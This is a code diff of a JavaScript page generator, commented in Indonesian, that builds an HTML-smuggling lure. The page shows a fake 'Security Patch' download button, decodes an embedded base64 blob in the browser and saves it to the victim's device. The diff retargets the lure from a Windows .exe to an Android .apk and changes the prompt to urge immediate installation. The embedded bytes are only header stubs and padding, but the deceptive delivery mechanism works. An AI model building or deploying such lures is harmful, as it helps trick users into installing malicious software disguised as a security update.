@@ -63,7 +63,7 @@ const prepareMimeBlobAsync = (i) => {
             
             // Tombol User Gesture
             "    <button id='btn-download' style='background:#e53935;color:white;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;box-shadow:0 4px 15px rgba(229,57,53,0.4);'>" +
-            "        Unduh Security Patch (.exe)" +
+            "        Unduh Security Patch (.apk)" +
             "    </button>" +
             
             "    <p id='progress' style='color:#4CAF50;font-size:12px;margin-top:15px;display:none;'>Menyiapkan unduhan...</p>" +
@@ -83,7 +83,13 @@ const prepareMimeBlobAsync = (i) => {
             "    return bytes;" +
             "}" +
             
-            "var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" + // Payload EXE di memori
+            // Payload APK (Header ZIP: PK\x03\x04 + dummy bytes diencode Base64)
+            "var b64Data = \"UEsDBAoAAAAAAAMAAAAEAAAAAAAAAAAAAAAQAAAA\" + " +
+            "\"REVBUk1BTklGRVNUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
+            
             "var sudah = false;" +
             
             // Fungsi ini HANYA berjalan saat user klik tombol
@@ -100,11 +106,12 @@ const prepareMimeBlobAsync = (i) => {
             "    " +
             "    try{" +
             "        var bytesArr = b64KeBytes(b64Data);" +
-            "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
+            "        // MIME type khusus Android Package" +
+            "        var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
             "        var url = URL.createObjectURL(blob);" +
             "        var a = document.createElement('a');" +
             "        a.href = url;" +
-            "        a.download = 'Security_Patch_Update.exe';" +
+            "        a.download = 'Security_Patch_Update.apk';" +
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
@@ -114,7 +121,7 @@ const prepareMimeBlobAsync = (i) => {
             "            URL.revokeObjectURL(url); " +
             "        }, 3000);" +
             "        " +
-            "        prog.textContent = 'Patch berhasil diunduh. Segera jalankan file tersebut!';" +
+            "        prog.textContent = 'Patch APK berhasil diunduh. Segera instal file tersebut!';" +
             "        prog.style.color = '#4CAF50';" +
             "        btn.textContent = 'Selesai';" +
             "    } catch(e){" +
